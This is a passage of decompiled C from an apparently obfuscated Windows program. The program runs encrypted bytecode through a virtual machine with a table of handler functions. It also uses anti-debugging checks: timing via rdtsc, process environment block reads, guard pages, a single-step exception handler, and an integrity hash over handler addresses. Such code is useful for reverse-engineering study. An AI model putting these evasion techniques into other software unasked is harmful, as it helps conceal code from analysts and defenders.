    FUN_140001bf0(*(undefined8 *)(param_1 + 0x278));
    *(undefined8 *)(param_1 + 0x278) = 0;
    *(undefined8 *)(param_1 + 0x268) = 0;
    *(undefined8 *)(param_1 + 0x270) = 0;
  }
  return;
}


// ==== FUN_1400039d0 @ 1400039d0 size 310

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_1400039d0(undefined8 *param_1)

{
  uint uVar1;
  uint uVar2;
  ulonglong uVar3;
  uint *puVar4;
  undefined1 auStack_38 [32];
  undefined1 local_18 [8];
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_38;
  if (*(int *)*param_1 != -0x7fffffff) {
    return 0;
  }
  uVar3 = *(ulonglong *)((int *)*param_1 + 10);
  puVar4 = FUN_1400015f0();
  uVar1 = *puVar4;
  puVar4 = FUN_1400015f0();
  uVar2 = puVar4[8];
  DAT_140010200 =
       (((((((((uint)uVar3 & 0xff ^ uVar1) * uVar2 ^ (uint)(byte)(uVar3 >> 8)) * uVar2 ^
            (uint)(byte)(uVar3 >> 0x10)) * uVar2 ^ (uint)(byte)(uVar3 >> 0x18)) * uVar2 ^
          (uint)(byte)(uVar3 >> 0x20)) * uVar2 ^ (uint)(byte)(uVar3 >> 0x28)) * uVar2 ^
        (uint)(byte)(uVar3 >> 0x30)) * uVar2 ^ (uint)(byte)(uVar3 >> 0x38)) * uVar2 ^ DAT_140010204
       ^ 0x3aae1e99;
  LOCK();
  UNLOCK();
  DAT_1400101f8 = rdtsc();
  LOCK();
  UNLOCK();
  if (uVar3 != 0) {
    FUN_140001af0(uVar3 & 0xfffffffffffff000,0x1000,0x104,local_18);
  }
  return 0xffffffff;
}


// ==== FUN_140003b10 @ 140003b10 size 274

void FUN_140003b10(void)

{
  ulonglong uVar1;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  
  if (DAT_140010338 == '\0') {
    DAT_140010200 = (uint)PTR_FUN_14000e320 ^ 0x9ea6ed67;
    DAT_140010338 = '\x01';
    DAT_140010204 = DAT_140010200;
    if (DAT_1400103a2 == '\0') {
      DAT_1400103a2 = '\x01';
      uVar1 = rdtsc();
      local_48 = 0x3b823985;
      local_44 = 0x4977e933;
      local_40 = 0x6e10;
      DAT_140010278 = uVar1 ^ 0x1da3c3583;
      local_3c = 6;
      local_38 = 0xeb0cec08;
      local_34 = 0x362e8632;
      local_30 = 0x61696b99;
      local_2c = 0x2b102b0;
      local_28 = 0x48c2cafa;
      local_24 = 0xe0fe6747;
      local_20 = 0xf2ae44c7;
      local_1c = 0x582d67;
      local_18 = 7;
      uVar1 = FUN_140007a40((longlong)&local_48,(longlong)&local_38);
      DAT_140010330 = uVar1 ^ DAT_140010278;
    }
    if ((code *)(DAT_140010330 ^ DAT_140010278) != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000140003c19. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      (*(code *)(DAT_140010330 ^ DAT_140010278))(1,FUN_1400039d0);
      return;
    }
  }
  return;
}


// ==== FUN_140003c30 @ 140003c30 size 615

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140003c30(longlong param_1,longlong *param_2)

{
  uint uVar1;
  longlong lVar2;
  longlong lVar3;
  void *pvVar4;
  longlong lVar5;
  uint *puVar6;
  ulonglong uVar7;
  undefined1 auStack_78 [32];
  undefined1 local_58 [8];
  undefined8 local_50;
  uint local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_78;
  lVar2 = param_2[1];
  lVar3 = *param_2;
  lVar5 = param_1;
  if (*(longlong *)(param_1 + 0x278) != 0) {
    FUN_140003910(param_1);
  }
  uVar7 = (lVar2 - lVar3) + 0xfffU & 0xfffffffffffff000;
  lVar5 = FUN_140001a00(lVar5,uVar7 + 0x2000);
  *(longlong *)(param_1 + 0x278) = lVar5;
  if (lVar5 == 0) {
    *(undefined1 *)(param_1 + 0x48) = 0;
  }
  else {
    *(longlong *)(param_1 + 0x268) = lVar5 + 0x1000;
    *(longlong *)(param_1 + 0x270) = lVar2 - lVar3;
    FUN_140001af0(lVar5,0x1000,1,local_58);
    FUN_140001af0(*(longlong *)(param_1 + 0x278) + 0x1000 + uVar7,0x1000,1,local_58);
    FUN_140003b10();
    if ((*(longlong *)(param_1 + 0x278) != 0) &&
       (lVar2 = *(longlong *)(param_1 + 0x270), lVar2 != 0)) {
      FUN_140001af0(*(longlong *)(param_1 + 0x278),0x1000,0x104,local_58);
      FUN_140001af0(((lVar2 + 0xfffU >> 0xc) + 1) * 0x1000 + *(longlong *)(param_1 + 0x278),0x1000,
                    0x104,local_58);
    }
    FUN_1400023d0(*(void **)(param_1 + 0x268),(void *)*param_2,param_2[1] - *param_2);
    pvVar4 = ProcessEnvironmentBlock;
    uVar7 = DAT_1400101f8;
    local_50 = 0;
    puVar6 = FUN_1400015f0();
    uVar1 = *puVar6;
    puVar6 = FUN_1400015f0();
    local_3c = (uint)(uVar7 >> 0x20) ^ puVar6[2] ^ (uint)((ulonglong)&local_50 >> 8);
    local_48 = (uint)pvVar4 ^ 0x9ea6ed67;
    local_44 = (uint)((ulonglong)pvVar4 >> 0x10) ^ (uint)&local_50;
    local_40 = (uint)uVar7 ^ uVar1 ^ 0x9ea6ed67;
    FUN_140001810(*(longlong *)(param_1 + 0x268),*(ulonglong *)(param_1 + 0x270),(int *)&local_48);
    FUN_1400022c0((longlong)&local_48,0x10);
    *(ulonglong *)(param_1 + 0x280) = (ulonglong)pvVar4 ^ 0x9ea6ed67;
    *(ulonglong *)(param_1 + 0x288) = (ulonglong)&local_50 ^ 0x9ea6ed67;
    *(ulonglong *)(param_1 + 0x298) = uVar7 ^ 0x9ea6ed67;
    local_50 = 0;
    FUN_1400022c0(param_1,0x40);
    FUN_1400022c0(param_1 + 0x58,0x200);
    if (*(longlong *)(param_1 + 0x260) != 0) {
      FUN_1400022c0(*(longlong *)(param_1 + 0x260),0x10000);
    }
    *(undefined8 *)(param_1 + 600) = 0;
    *(undefined8 *)(param_1 + 0x40) = 0;
    *(undefined8 *)(param_1 + 0x4c) = 0;
    *(undefined8 *)(param_1 + 0x4c0) = 0;
    *(undefined8 *)(param_1 + 0x4c8) = 0;
    *(undefined2 *)(param_1 + 0x48) = 1;
  }
  return;
}


// ==== FUN_140003ea0 @ 140003ea0 size 2476

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140003ea0(longlong param_1)

{
  byte bVar1;
  ushort uVar2;
  uint uVar3;
  char cVar4;
  bool bVar5;
  uint uVar6;
  uint uVar7;
  uint *puVar8;
  undefined8 uVar9;
  longlong lVar10;
  ulonglong uVar11;
  longlong lVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  longlong lVar16;
  uint uVar17;
  ulonglong uVar18;
  uint uVar19;
  undefined1 auStack_b8 [32];
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  uint local_80 [2];
  undefined8 local_78;
  uint uStack_70;
  uint uStack_6c;
  uint local_68;
  uint local_64;
  uint local_60;
  uint local_5c;
  ulonglong local_58;
  
  local_58 = DAT_140010000 ^ (ulonglong)auStack_b8;
  FUN_140003b10();
  FUN_140001fb0();
  FUN_1400035b0();
  DAT_140010248 = &PTR_FUN_14000e320;
  FUN_1400033d0();
  FUN_140002800();
  uVar2 = *(ushort *)(param_1 + 0x4a8);
  lVar16 = 0x10;
  if (((uVar2 != 0) && (*(void **)(param_1 + 0x4a0) != (void *)0x0)) &&
     (*(void **)(param_1 + 0x260) != (void *)0x0)) {
    uVar3 = *(uint *)(param_1 + 0x4bc);
    uVar6 = (uint)uVar2;
    uStack_70 = uVar3 ^ *(uint *)(param_1 + 0x4b4);
    uStack_6c = uVar3 ^ *(uint *)(param_1 + 0x4b8);
    local_78 = (void *)CONCAT44(uVar3 ^ *(uint *)(param_1 + 0x4b0),
                                uVar3 ^ *(uint *)(param_1 + 0x4ac));
    FUN_1400023d0(*(void **)(param_1 + 0x260),*(void **)(param_1 + 0x4a0),(ulonglong)uVar6);
    FUN_140001810(*(longlong *)(param_1 + 0x260),(ulonglong)uVar6,(int *)&local_78);
    *(undefined1 *)((ulonglong)uVar6 + *(longlong *)(param_1 + 0x260)) = 0;
    FUN_1400022c0((longlong)&local_78,0x10);
    FUN_1400022c0(*(longlong *)(param_1 + 0x4a0),0x10000);
    FUN_140001bf0(*(undefined8 *)(param_1 + 0x4a0));
    *(undefined8 *)(param_1 + 0x4a0) = 0;
    *(undefined2 *)(param_1 + 0x4a8) = 0;
    FUN_1400022c0(param_1 + 0x4ac,0x10);
    *(undefined4 *)(param_1 + 0x4bc) = 0;
  }
  uVar11 = *(ulonglong *)(param_1 + 0x280) ^ 0x9ea6ed67;
  uVar9 = *(undefined8 *)(param_1 + 0x298);
  uVar18 = *(ulonglong *)(param_1 + 0x288) ^ 0x9ea6ed67;
  uVar19 = (uint)uVar9 ^ 0x9ea6ed67;
  local_78 = ProcessEnvironmentBlock;
  puVar8 = FUN_1400015f0();
  uVar3 = *puVar8;
  puVar8 = FUN_1400015f0();
  uVar6 = (uint)uVar11;
  local_68 = uVar6 ^ 0x9ea6ed67;
  uVar17 = (uint)((ulonglong)uVar9 >> 0x20);
  local_5c = (uint)(uVar18 >> 8) ^ puVar8[2] ^ uVar17;
  uVar7 = (uint)uVar18;
  local_64 = (uint)(uVar11 >> 0x10) ^ uVar7;
  local_60 = uVar19 ^ uVar3 ^ 0x9ea6ed67;
  uVar11 = FUN_1400036b0(uVar6);
  if ((char)uVar11 == '\0') {
    FUN_140003710(uVar7);
    local_68 = local_68 ^ 0xdeadbeef;
  }
  local_80[0] = (uint)((ulonglong)local_78 >> 0x10) ^ *(uint *)(param_1 + 0x290) ^ uVar17 ^ uVar19 ^
                (uint)local_78 ^ 0x9ea6ed67;
  uVar11 = (ulonglong)local_80[0];
  uVar9 = FUN_1400036e0(local_80[0]);
  if ((char)uVar9 != '\0') {
    FUN_140003770(local_80[0]);
    puVar8 = FUN_1400015f0();
    uVar11 = (ulonglong)puVar8[1];
    local_80[0] = local_80[0] ^ puVar8[1];
  }
  local_78 = (void *)0x0;
  puVar8 = FUN_1400015f0();
  uVar3 = puVar8[0xb];
  puVar8 = FUN_1400015f0();
  uVar6 = puVar8[10];
  puVar8 = FUN_1400015f0();
  uVar17 = puVar8[0xd];
  puVar8 = FUN_1400015f0();
  uVar7 = puVar8[0xc];
  uVar19 = FUN_140003510(uVar11);
  uVar13 = 0xdead0001;
  if (DAT_140010200 == DAT_140010204) {
    uVar13 = 0;
  }
  if ((uVar13 | uVar19) != 0) {
    uVar19 = (uVar13 | uVar19) ^ *(uint *)(param_1 + 0x50);
    *(uint *)(param_1 + 0x50) = uVar19 << 0xb | uVar19 >> 0x15;
  }
  if (*(char *)(param_1 + 0x48) != '\0') {
    lVar10 = CONCAT44(uVar17,uVar7);
    do {
      puVar8 = *(uint **)(param_1 + 0x270);
      if (puVar8 <= *(uint **)(param_1 + 0x40)) break;
      *(int *)(param_1 + 0x4c) = *(int *)(param_1 + 0x4c) + 1;
      uVar11 = (ulonglong)*(uint *)(param_1 + 0x4c);
      bVar5 = FUN_140003700(*(uint *)(param_1 + 0x4c));
      if (bVar5) {
        FUN_140003770((uint)uVar11);
        uVar11 = (ulonglong)*(uint *)(param_1 + 0x4c);
        local_68 = local_68 ^ *(uint *)(param_1 + 0x4c);
      }
      if ((uVar11 & 0x3f) == 0) {
        puVar8 = FUN_1400015f0();
        uVar17 = puVar8[0xb];
        puVar8 = FUN_1400015f0();
        uVar7 = puVar8[10];
        puVar8 = FUN_1400015f0();
        uVar19 = puVar8[0xd];
        puVar8 = FUN_1400015f0();
        lVar12 = CONCAT44(uVar19,puVar8[0xc]);
        uVar19 = FUN_140003510(uVar11);
        uVar13 = 0;
        if (((((((((((((((((((((((((((((((((CONCAT44(uVar17,uVar7) ^ 0x140004d30) * lVar12 ^
                                          0x140004e10) * lVar12 ^ 0x140004e70) * lVar12 ^
                                        0x140004ed0) * lVar12 ^ 0x140004f30) * lVar12 ^ 0x140004fb0)
                                      * lVar12 ^ 0x140005030) * lVar12 ^ 0x140005090) * lVar12 ^
                                   0x1400050f0) * lVar12 ^ 0x140005150) * lVar12 ^ 0x140005180) *
                                 lVar12 ^ 0x1400051e0) * lVar12 ^ 0x140004db0) * lVar12 ^
                              0x140005240) * lVar12 ^ 0x1400052a0) * lVar12 ^ 0x1400052e0) * lVar12
                           ^ 0x140005320) * lVar12 ^ 0x140005360) * lVar12 ^ 0x1400053b0) * lVar12 ^
                        0x140005410) * lVar12 ^ 0x140005470) * lVar12 ^ 0x1400054a0) * lVar12 ^
                     0x1400054c0) * lVar12 ^ 0x1400055c0) * lVar12 ^ 0x140005870) * lVar12 ^
                  0x140005890) * lVar12 ^ 0x140005a10) * lVar12 ^ 0x1400054b0) * lVar12 ^
               0x140005b00) * lVar12 ^ 0x140005b40) * lVar12 ^ 0x140005da0) * lVar12 ^ 0x140005b20)
            * lVar12 !=
            ((((((((((((((((((((((((((((((((CONCAT44(uVar3,uVar6) ^ 0x140004d30) * lVar10 ^
                                          0x140004e10) * lVar10 ^ 0x140004e70) * lVar10 ^
                                        0x140004ed0) * lVar10 ^ 0x140004f30) * lVar10 ^ 0x140004fb0)
                                      * lVar10 ^ 0x140005030) * lVar10 ^ 0x140005090) * lVar10 ^
                                   0x1400050f0) * lVar10 ^ 0x140005150) * lVar10 ^ 0x140005180) *
                                 lVar10 ^ 0x1400051e0) * lVar10 ^ 0x140004db0) * lVar10 ^
                              0x140005240) * lVar10 ^ 0x1400052a0) * lVar10 ^ 0x1400052e0) * lVar10
                           ^ 0x140005320) * lVar10 ^ 0x140005360) * lVar10 ^ 0x1400053b0) * lVar10 ^
                        0x140005410) * lVar10 ^ 0x140005470) * lVar10 ^ 0x1400054a0) * lVar10 ^
                     0x1400054c0) * lVar10 ^ 0x1400055c0) * lVar10 ^ 0x140005870) * lVar10 ^
                  0x140005890) * lVar10 ^ 0x140005a10) * lVar10 ^ 0x1400054b0) * lVar10 ^
               0x140005b00) * lVar10 ^ 0x140005b40) * lVar10 ^ 0x140005da0) * lVar10 ^ 0x140005b20)
            * lVar10) {
          uVar13 = 0xbad00000;
        }
        uVar17 = 0xdead0001;
        if (DAT_140010200 == DAT_140010204) {
          uVar17 = 0;
        }
        uVar19 = uVar13 | uVar17 | uVar19;
        if (uVar19 != 0) {
          uVar19 = uVar19 ^ *(uint *)(param_1 + 0x50);
          *(uint *)(param_1 + 0x50) = uVar19 << 0x11 | uVar19 >> 0xf;
        }
      }
      puVar8 = (uint *)0x0;
      if (DAT_140010200 != DAT_140010204) {
        puVar8 = FUN_1400015f0();
        uVar17 = *puVar8;
        puVar8 = FUN_1400015f0();
        *(uint *)(param_1 + 0x50) = *(uint *)(param_1 + 0x50) ^ uVar17 ^ puVar8[1];
      }
      uVar17 = local_80[0];
      uVar11 = *(ulonglong *)(param_1 + 0x40);
      if (*(ulonglong *)(param_1 + 0x270) <= uVar11) {
        *(undefined1 *)(param_1 + 0x48) = 0;
        break;
      }
      *(ulonglong *)(param_1 + 0x40) = uVar11 + 1;
      puVar8 = FUN_1400015f0();
      uVar7 = (uint)(uVar11 >> 2) ^ local_68 + local_64 ^ local_5c;
      uVar19 = uVar7 << 0x10 | uVar7 >> 0x10;
      uVar7 = uVar19 + local_60 ^ local_64;
      uVar13 = uVar7 << 0xc | uVar7 >> 0x14;
      uVar7 = local_68 + local_64 + uVar13;
      uVar14 = uVar7 ^ uVar19;
      uVar15 = uVar14 << 8 | uVar14 >> 0x18;
      uVar14 = uVar15 + uVar19 + local_60;
      uVar13 = uVar14 ^ uVar13;
      uVar19 = uVar13 << 7 | uVar13 >> 0x19;
      uVar7 = uVar19 + uVar7;
      uVar15 = uVar7 ^ uVar15;
      uVar15 = uVar15 << 0x10 | uVar15 >> 0x10;
      uVar19 = uVar15 + uVar14 ^ uVar19;
      uVar19 = uVar19 << 0xc | uVar19 >> 0x14;
      uVar7 = uVar19 + uVar7;
      uVar13 = uVar7 ^ uVar15;
      uVar13 = uVar13 << 8 | uVar13 >> 0x18;
      uVar14 = uVar14 + uVar13 + uVar15;
      uVar19 = uVar14 ^ uVar19;
      uVar19 = uVar19 << 7 | uVar19 >> 0x19;
      uVar7 = uVar19 + uVar7;
      uVar13 = uVar7 ^ uVar13;
      uVar15 = uVar13 << 0x10 | uVar13 >> 0x10;
      uVar19 = uVar15 + uVar14 ^ uVar19;
      uVar19 = uVar19 << 0xc | uVar19 >> 0x14;
      uVar7 = uVar19 + uVar7;
      uVar13 = uVar7 ^ uVar15;
      uVar13 = uVar13 << 8 | uVar13 >> 0x18;
      uVar14 = uVar14 + uVar13 + uVar15;
      uVar19 = uVar14 ^ uVar19;
      uVar19 = uVar19 << 7 | uVar19 >> 0x19;
      uVar7 = uVar19 + uVar7;
      uVar13 = uVar7 ^ uVar13;
      uVar15 = uVar13 << 0x10 | uVar13 >> 0x10;
      uVar19 = uVar15 + uVar14 ^ uVar19;
      uVar19 = uVar19 << 0xc | uVar19 >> 0x14;
      uVar7 = uVar19 + uVar7;
      uVar13 = uVar7 ^ uVar15;
      uVar13 = uVar13 << 8 | uVar13 >> 0x18;
      uVar14 = uVar13 + uVar15 + uVar14;
      uVar19 = uVar14 ^ uVar19;
      cVar4 = (char)puVar8[8];
      bVar1 = *(byte *)(*(longlong *)(param_1 + 0x268) + uVar11);
      *(uint **)(param_1 + 0x4c0) = &local_68;
      *(uint **)(param_1 + 0x4c8) = local_80;
      (*(code *)(&PTR_FUN_14000e320)
                [*(byte *)((ulonglong)
                           (byte)((byte)(((uVar19 << 7 | uVar19 >> 0x19) ^ uVar14 ^ uVar13 ^ uVar7)
                                        >> (((byte)uVar11 & 3) << 3)) ^
                                  (((((((((byte)uVar11 ^ (byte)uVar17) * cVar4 ^ (byte)(uVar11 >> 8)
                                        ) * cVar4 ^ (byte)(uVar11 >> 0x10)) * cVar4 ^
                                      (byte)(uVar11 >> 0x18)) * cVar4 ^ (byte)(uVar11 >> 0x20)) *
                                     cVar4 ^ (byte)(uVar11 >> 0x28)) * cVar4 ^
                                   (byte)(uVar11 >> 0x30)) * cVar4 ^ (byte)(uVar11 >> 0x38)) * cVar4
                                 ^ bVar1) + 0x3a0 + param_1)])(param_1);
      puVar8 = (uint *)0x0;
      *(undefined8 *)(param_1 + 0x4c0) = 0;
      *(undefined8 *)(param_1 + 0x4c8) = 0;
    } while (*(char *)(param_1 + 0x48) != '\0');
    if (DAT_1400101e8 == '\0') {
      DAT_1400101e8 = '\x01';
      uVar11 = rdtsc();
      local_78 = (void *)0x67b65559057df048;
      uStack_70 = 0x93b5;
      DAT_140010390 =
           (CONCAT44((int)((ulonglong)puVar8 >> 0x20),(int)uVar11) | uVar11 & 0xffffffff00000000) ^
           0x1862cf54d;
      uStack_6c = 0x12;
      local_98 = 0x1c333fba;
      local_94 = 0x603a497b;
      local_90 = 0xb3c64476;
      local_8c = 0x8be4c1d1;
      local_88 = 0x7b74986;
      local_84 = 0x13;
      uVar11 = FUN_140008940((longlong)&local_78,(longlong)&local_98);
      DAT_1400101b0 = uVar11 ^ DAT_140010390;
    }
    if ((code *)(DAT_1400101b0 ^ DAT_140010390) == (code *)0x0) {
      puVar8 = &local_68;
      do {
        *(undefined1 *)puVar8 = 0;
        puVar8 = (uint *)((longlong)puVar8 + 1);
        lVar16 = lVar16 + -1;
      } while (lVar16 != 0);
    }
    else {
      (*(code *)(DAT_1400101b0 ^ DAT_140010390))(&local_68,0x10);
    }
    FUN_1400022c0(param_1 + 0x2a0,0x200);
  }
  return;
}


// ==== FUN_140004850 @ 140004850 size 553

ulonglong FUN_140004850(longlong param_1)

{
  undefined4 uVar1;
  ulonglong uVar2;
  int *piVar3;
  char cVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  ulonglong in_RAX;
  uint *puVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  if (((*(longlong *)(param_1 + 0x4c0) == 0) ||
      (*(undefined4 **)(param_1 + 0x4c8) == (undefined4 *)0x0)) ||
     (uVar2 = *(ulonglong *)(param_1 + 0x40), *(ulonglong *)(param_1 + 0x270) <= uVar2)) {
    *(undefined1 *)(param_1 + 0x48) = 0;
    return in_RAX & 0xffffffffffffff00;
  }
  *(ulonglong *)(param_1 + 0x40) = uVar2 + 1;
  uVar1 = **(undefined4 **)(param_1 + 0x4c8);
  puVar8 = FUN_1400015f0();
  piVar3 = *(int **)(param_1 + 0x4c0);
  uVar5 = (uint)(uVar2 >> 2) ^ piVar3[3] ^ *piVar3 + piVar3[1];
  uVar6 = uVar5 << 0x10 | uVar5 >> 0x10;
  uVar5 = uVar6 + piVar3[2] ^ piVar3[1];
  uVar9 = uVar5 << 0xc | uVar5 >> 0x14;
  uVar5 = uVar9 + *piVar3 + piVar3[1];
  uVar10 = uVar5 ^ uVar6;
  uVar11 = uVar10 << 8 | uVar10 >> 0x18;
  uVar10 = uVar11 + uVar6 + piVar3[2];
  uVar9 = uVar10 ^ uVar9;
  uVar6 = uVar9 << 7 | uVar9 >> 0x19;
  uVar5 = uVar6 + uVar5;
  uVar11 = uVar5 ^ uVar11;
  uVar11 = uVar11 << 0x10 | uVar11 >> 0x10;
  uVar6 = uVar11 + uVar10 ^ uVar6;
  uVar6 = uVar6 << 0xc | uVar6 >> 0x14;
  uVar5 = uVar6 + uVar5;
  uVar9 = uVar5 ^ uVar11;
  uVar9 = uVar9 << 8 | uVar9 >> 0x18;
  uVar10 = uVar10 + uVar9 + uVar11;
  uVar6 = uVar10 ^ uVar6;
  uVar6 = uVar6 << 7 | uVar6 >> 0x19;
  uVar5 = uVar6 + uVar5;
  uVar9 = uVar5 ^ uVar9;
  uVar11 = uVar9 << 0x10 | uVar9 >> 0x10;
  uVar6 = uVar11 + uVar10 ^ uVar6;
  uVar6 = uVar6 << 0xc | uVar6 >> 0x14;
  uVar5 = uVar6 + uVar5;
  uVar9 = uVar5 ^ uVar11;
  uVar9 = uVar9 << 8 | uVar9 >> 0x18;
  uVar10 = uVar10 + uVar9 + uVar11;
  uVar6 = uVar10 ^ uVar6;
  uVar6 = uVar6 << 7 | uVar6 >> 0x19;
  uVar5 = uVar6 + uVar5;
  uVar9 = uVar5 ^ uVar9;
  uVar11 = uVar9 << 0x10 | uVar9 >> 0x10;
  uVar6 = uVar11 + uVar10 ^ uVar6;
  uVar6 = uVar6 << 0xc | uVar6 >> 0x14;
  uVar5 = uVar6 + uVar5;
  uVar9 = uVar5 ^ uVar11;
  uVar9 = uVar9 << 8 | uVar9 >> 0x18;
  uVar10 = uVar9 + uVar11 + uVar10;
  uVar6 = uVar10 ^ uVar6;
  cVar4 = (char)puVar8[8];
  iVar7 = (uint)(byte)(((((((((byte)uVar1 ^ (byte)uVar2) * cVar4 ^ (byte)(uVar2 >> 8)) * cVar4 ^
                           (byte)(uVar2 >> 0x10)) * cVar4 ^ (byte)(uVar2 >> 0x18)) * cVar4 ^
                         (byte)(uVar2 >> 0x20)) * cVar4 ^ (byte)(uVar2 >> 0x28)) * cVar4 ^
                       (byte)(uVar2 >> 0x30)) * cVar4 ^ (byte)(uVar2 >> 0x38)) * (puVar8[8] & 0xff);
  return (ulonglong)
         CONCAT31((int3)((uint)iVar7 >> 8),
                  (byte)iVar7 ^
                  (byte)(((uVar6 << 7 | uVar6 >> 0x19) ^ uVar10 ^ uVar9 ^ uVar5) >>
                        (((byte)uVar2 & 3) << 3)) ^
                  *(byte *)(*(longlong *)(param_1 + 0x268) + uVar2));
}


// ==== FUN_140004a80 @ 140004a80 size 687

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140004a80(byte param_1,byte param_2,byte param_3)

{
  int iVar1;
  longlong lVar2;
  ulonglong uVar3;
  longlong lVar4;
  longlong lVar5;
  uint uVar6;
  int iVar7;
  ulonglong uVar8;
  uint uVar9;
  int iVar10;
  undefined1 auStack_98 [31];
  char acStack_79 [25];
  char local_60 [8];
  undefined4 local_58;
  undefined2 local_54;
  undefined1 local_52;
  undefined1 local_51 [25];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_98;
  iVar7 = 0;
  lVar4 = 7;
  uVar6 = 1;
  local_58 = 0x38335b1b;
  local_54 = 0x323b;
  local_52 = 0x3b;
  if (param_1 == 0) {
    local_60[0] = '0';
    local_60[1] = '\0';
    uVar9 = 1;
LAB_140004b6d:
    iVar10 = 0;
    memcpy(local_51,local_60,(ulonglong)uVar9);
    do {
      lVar4 = lVar4 + 1;
      iVar10 = iVar10 + 1;
    } while (iVar10 < (int)uVar9);
  }
  else {
    uVar9 = 0;
    uVar8 = (ulonglong)param_1;
    do {
      uVar3 = uVar8 / 10;
      lVar5 = (longlong)(int)uVar9;
      uVar9 = uVar9 + 1;
      acStack_79[lVar5 + 1] = (char)uVar8 + (char)uVar3 * -10 + '0';
      uVar8 = uVar3;
    } while (uVar3 != 0);
    iVar10 = 0;
    if (0 < (int)uVar9) {
      do {
        lVar5 = (longlong)iVar10;
        iVar1 = uVar9 - iVar10;
        iVar10 = iVar10 + 1;
        acStack_79[lVar5 + 0x19] = acStack_79[iVar1];
      } while (iVar10 < (int)uVar9);
    }
    acStack_79[(longlong)(int)uVar9 + 0x19] = '\0';
    if (0 < (int)uVar9) goto LAB_140004b6d;
  }
  local_51[lVar4 + -7] = 0x3b;
  lVar5 = lVar4 + 1;
  if ((ulonglong)param_2 == 0) {
    local_60[0] = '0';
    local_60[1] = '\0';
    uVar9 = 1;
LAB_140004c2d:
    iVar10 = 0;
    memcpy(local_51 + lVar4 + -6,local_60,(ulonglong)uVar9);
    do {
      lVar5 = lVar5 + 1;
      iVar10 = iVar10 + 1;
    } while (iVar10 < (int)uVar9);
  }
  else {
    uVar9 = 0;
    uVar8 = (ulonglong)param_2;
    do {
      uVar3 = uVar8 / 10;
      lVar2 = (longlong)(int)uVar9;
      uVar9 = uVar9 + 1;
      acStack_79[lVar2 + 1] = (char)uVar8 + (char)uVar3 * -10 + '0';
      uVar8 = uVar3;
    } while (uVar3 != 0);
    iVar10 = 0;
    if (0 < (int)uVar9) {
      do {
        lVar2 = (longlong)iVar10;
        iVar1 = uVar9 - iVar10;
        iVar10 = iVar10 + 1;
        acStack_79[lVar2 + 0x19] = acStack_79[iVar1];
      } while (iVar10 < (int)uVar9);
    }
    acStack_79[(longlong)(int)uVar9 + 0x19] = '\0';
    if (0 < (int)uVar9) goto LAB_140004c2d;
  }
  local_51[lVar5 + -7] = 0x3b;
  lVar4 = lVar5 + 1;
  if ((ulonglong)param_3 == 0) {
    local_60[0] = '0';
    local_60[1] = '\0';
  }
  else {
    uVar6 = 0;
    uVar8 = (ulonglong)param_3;
    do {
      uVar3 = uVar8 / 10;
      lVar2 = (longlong)(int)uVar6;
      uVar6 = uVar6 + 1;
      acStack_79[lVar2 + 1] = (char)uVar8 + (char)uVar3 * -10 + '0';
      uVar8 = uVar3;
    } while (uVar3 != 0);
    iVar10 = 0;
    if (0 < (int)uVar6) {
      do {
        lVar2 = (longlong)iVar10;
        iVar1 = uVar6 - iVar10;
        iVar10 = iVar10 + 1;
        acStack_79[lVar2 + 0x19] = acStack_79[iVar1];
      } while (iVar10 < (int)uVar6);
    }
    acStack_79[(longlong)(int)uVar6 + 0x19] = '\0';
    if ((int)uVar6 < 1) goto LAB_140004d09;
  }
  memcpy(local_51 + lVar5 + -6,local_60,(ulonglong)uVar6);
  do {
    lVar4 = lVar4 + 1;
    iVar7 = iVar7 + 1;
  } while (iVar7 < (int)uVar6);
LAB_140004d09:
  local_51[lVar4 + -7] = 0x6d;
  FUN_140002280((longlong)&local_58,(int)lVar4 + 1);
  return;
}


// ==== FUN_140004d30 @ 140004d30 size 119

void FUN_140004d30(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong *puVar6;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  uVar4 = FUN_140004850(param_1);
  uVar5 = FUN_140004850(param_1);
  puVar6 = (ulonglong *)(param_1 + (uVar1 & 0xff) * 8);
  if (7 < (byte)uVar1) {
    puVar6 = &DAT_140010260;
  }
  *puVar6 = (((uVar5 & 0xff) << 8 | uVar4 & 0xff) << 8 | uVar3 & 0xff) << 8 | uVar2 & 0xff;
  return;
}


// ==== FUN_140004db0 @ 140004db0 size 91

void FUN_140004db0(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined8 *puVar3;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  if ((byte)uVar2 < 8) {
    puVar3 = (undefined8 *)(param_1 + (uVar2 & 0xff) * 8);
  }
  else {
    puVar3 = &DAT_140010260;
  }
  if ((byte)uVar1 < 8) {
    *(undefined8 *)(param_1 + (uVar1 & 0xff) * 8) = *puVar3;
    return;
  }
  DAT_140010260 = *puVar3;
  return;
}


// ==== FUN_140004e10 @ 140004e10 size 91

void FUN_140004e10(longlong param_1)

{
  longlong *plVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  longlong *plVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
